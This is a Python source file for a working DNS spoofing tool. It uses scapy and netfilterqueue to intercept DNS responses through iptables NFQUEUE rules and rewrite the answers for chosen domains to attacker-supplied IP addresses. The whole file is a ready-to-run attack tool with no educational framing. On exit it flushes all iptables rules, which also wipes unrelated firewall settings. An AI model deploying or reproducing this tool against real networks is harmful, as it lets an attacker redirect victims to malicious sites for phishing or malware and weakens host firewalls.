#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import argparse
import logging
import os
import sys

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# Function to process each packet in the queue
def process_packet(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())
        # Only process DNS responses
        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNSQR].qname.decode()
            for target_domain, spoofed_ip in target_domains.items():
                if target_domain in qname:
                    logging.info(f"[+] Spoofing DNS request for {target_domain}")
                    # Crafting the spoofed response
                    answer = scapy.DNSRR(rrname=qname, rdata=spoofed_ip)
                    scapy_packet[scapy.DNS].an = answer
                    scapy_packet[scapy.DNS].ancount = 1

                    # Recalculate packet checksums
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.UDP].len
                    del scapy_packet[scapy.UDP].chksum

                    # Set modified packet as payload
                    packet.set_payload(bytes(scapy_packet))
                    break  # Stop after the first domain match

        packet.accept()

    except Exception as e:
        logging.error(f"Error processing packet: {e}")
        packet.accept()

# Function to clean up iptables rules when the script exits
def clean_up_iptables():
    logging.info("[*] Flushing iptables rules...")
    os.system("sudo iptables --flush")

# Function to set up iptables rules
def setup_iptables(queue_num):
    logging.info(f"[*] Setting up iptables to redirect DNS traffic to queue {queue_num}")
    os.system(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {queue_num}")
    os.system(f"sudo iptables -I OUTPUT -j NFQUEUE --queue-num {queue_num}")
    os.system(f"sudo iptables -I INPUT -j NFQUEUE --queue-num {queue_num}")

# Command-line arguments parsing
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Spoofing Tool")
    parser.add_argument("-q", "--queue-num", type=int, default=0, help="NetfilterQueue number")
    parser.add_argument("-t", "--targets", nargs="+", help="Target domains to spoof in the format domain=IP", required=True)
    args = parser.parse_args()

    # Parse target domains and IPs
    target_domains = {}
    for target in args.targets:
        domain, ip = target.split("=")
        target_domains[domain] = ip

    # Setup iptables rules
    try:
        setup_iptables(args.queue_num)
    except Exception as e:
        logging.error(f"Failed to set up iptables: {e}")
        sys.exit(1)

    # Bind the queue and start processing packets
    try:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(args.queue_num, process_packet)
        logging.info(f"[*] Running DNS spoofing on queue {args.queue_num}")
        queue.run()
    except KeyboardInterrupt:
        logging.info("\n[!] Detected CTRL+C, quitting...")

    # Clean up iptables rules on exit
    finally:
        clean_up_iptables()
